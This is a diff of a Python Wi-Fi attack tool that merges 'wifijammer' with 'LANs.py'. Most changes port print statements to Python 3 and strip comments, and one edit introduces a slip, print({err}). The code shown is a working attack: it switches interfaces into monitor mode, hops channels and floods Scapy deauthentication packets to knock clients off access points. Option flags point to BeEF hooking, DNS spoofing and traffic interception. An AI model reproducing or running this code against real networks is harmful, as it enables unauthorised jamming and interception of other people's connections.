         os.system('ifconfig %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
@@ -1321,7 +1290,7 @@ def mon_mac(mon_iface):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
     mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
-    print '[' + G + '*' + W + '] Monitor mode: ' + G + mon_iface + W + ' - ' + O + mac + W
+    print('[' + G + '*' + W + '] Monitor mode: ' + G + mon_iface + W + ' - ' + O + mac + W)
     return mac
 
 
@@ -1345,14 +1314,14 @@ def channel_hop(mon_iface, args):
 
             proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
             for line in proc.communicate()[1].split('\n'):
-                if len(line) > 2:  # iw dev shouldnt display output unless there's an error
+                if len(line) > 2:  
                     err = '[' + R + '-' + W + '] Channel hopping failed: ' + R + line + W
 
         output(err, monchannel)
         if args.channel:
             time.sleep(.05)
         else:
-            # For the first channel hop thru, do not deauth
+            
             if first_pass == 1:
                 time.sleep(1)
                 continue
@@ -1369,10 +1338,6 @@ def deauth(monchannel):
                 client = x[0]
                 ap = x[1]
                 ch = x[2]
-                # Can't add a RadioTap() layer as the first layer or it's a malformed
-                # Association request packet?
-                # Append the packets to a new list so we don't have to hog the lock
-                # type=0, subtype=12?
                 if ch == monchannel:
                     deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                     deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client) / Dot11Deauth()
@@ -1389,7 +1354,6 @@ def deauth(monchannel):
                         pkts.append(deauth_ap)
 
     if len(pkts) > 0:
-        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
         if not args.timeinterval:
             args.timeinterval = 0
         if not args.packets:
@@ -1403,29 +1367,28 @@ def output(err, monchannel):
     os.system('clear')
     mon_iface = get_mon_iface(args)
     if err:
-        print err
+        print({err})
     else:
-        print '[' + G + '+' + W + '] ' + mon_iface + ' channel: ' + G + monchannel + W + '\n'
+        print('[' + G + '+' + W + '] ' + mon_iface + ' channel: ' + G + monchannel + W + '\n')
     if len(clients_APs) > 0:
-        print '                  Deauthing                 ch   ESSID'
-    # Print the deauth list
+        print('                  Deauthing                 ch   ESSID')
+
     with lock:
         for ca in clients_APs:
             if len(ca) > 3:
-                print '[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(
-                    2) + ' - ' + T + ca[3] + W
+                print('[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(
+                    2) + ' - ' + T + ca[3] + W)
             else:
-                print '[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] + W + ' - ' + ca[2]
+                print('[' + T + '*' + W + '] ' + O + ca[0] + W + ' - ' + O + ca[1] + W + ' - ' + ca[2])
     if len(APs) > 0:
-        print '\n      Access Points     ch   ESSID'
+        print('\n      Access Points     ch   ESSID')
     with lock:
         for ap in APs:
-            print '[' + T + '*' + W + '] ' + O + ap[0] + W + ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W
-    print ''
+            print('[' + T + '*' + W + '] ' + O + ap[0] + W + ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W)
+    print(" ")
 
 
 def noise_filter(skip, addr1, addr2):
-    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
     ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:',
               mon_MAC]
     if skip:
@@ -1446,26 +1409,16 @@ def cb(pkt):
                 with lock:
                     clients_APs = []
                     APs = []
-
-    # We're adding the AP and channel to the deauth list at time of creation rather
-    # than updating on the fly in order to avoid costly for loops that require a lock
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
 
-            # Filter out all other APs and clients if asked
             if args.accesspoint:
                 if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                     return
-
-            # Check if it's added to our AP list
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 APs_add(clients_APs, APs, pkt, args.channel)
-
-            # Ignore all the noisy packets like spanning tree
             if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                 return
-
-            # Management = 1, data = 2
             if pkt.type in [1, 2]:
                 clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
@@ -1474,9 +1427,7 @@ def APs_add(clients_APs, APs, pkt, chan_arg):
     ssid = pkt[Dot11Elt].info
     bssid = pkt[Dot11].addr3
     try:
-        # Thanks to airoscapy for below
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
-        # Prevent 5GHz APs from being thrown into the mix
         chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
         if ap_channel not in chans:
             return
@@ -1507,7 +1458,6 @@ def clients_APs_add(clients_APs, addr1, addr2):
         else:
             AP_check(addr1, addr2)
 
-    # Append new clients/APs if they're not in the list
     else:
         for ca in clients_APs:
             if addr1 in ca and addr2 in ca:
@@ -1534,11 +1484,6 @@ def stop(signal, frame):
         remove_mon_iface(mon_iface)
         sys.exit('\n[' + R + '!' + W + '] Closing')
 
-#############################
-#####End wifijammer Code#####
-#############################
-
-
 if __name__ == "__main__":
     if not os.geteuid() == 0:
         exit("\nPlease run as root\n")
@@ -1549,15 +1494,12 @@ if __name__ == "__main__":
         pcap_handler(args)
         exit('[-] Finished parsing pcap file')
     if args.skip is not None or args.channel is not None or args.maximum is not None or args.noupdate is not False or args.timeinterval is not None or args.packets is not None or args.directedonly is not False or args.accesspoint is not None:
-        ###If wifijammer arguments are given
+        
         if args.beef is not None or args.code is not None or args.urlspy is not False or args.ipaddress is not None or args.victimmac is not None or args.driftnet is not False or args.verboseURL is not False or args.dnsspoof is not None or args.dnsall is not False or args.setoolkit is not False or args.post is not False or args.nmapaggressive is not False or args.nmap is not False or args.redirectto is not None or args.routerip is not None or args.routermac is not None or args.pcap is not None:
-            ###If LANs.py arguments are given
-            ###Both LANs.py arguments and wifijammer arguments are given. This will not work since wifijammer jams the network that LANs.py is trying to monitor
+            
             exit('Error. Cannot jam WiFi and monitor WiFi simultaneously')
 
     if args.beef is not None or args.code is not None or args.urlspy is not False or args.ipaddress is not None or args.victimmac is not None or args.driftnet is not False or args.verboseURL is not False or args.dnsspoof is not None or args.dnsall is not False or args.setoolkit is not False or args.post is not False or args.nmapaggressive is not False or args.nmap is not False or args.redirectto is not None or args.routerip is not None or args.routermac is not None or args.pcap is not None:
-        ###If LANs.py arguments are given, then run as LANs.py
         LANsMain(args)
     else:
-        ###If no LANs.py arguments are given, then run as wifijammer (expected behavior of jamming wifi when no arguments given is continued)
         wifijammerMain(args)
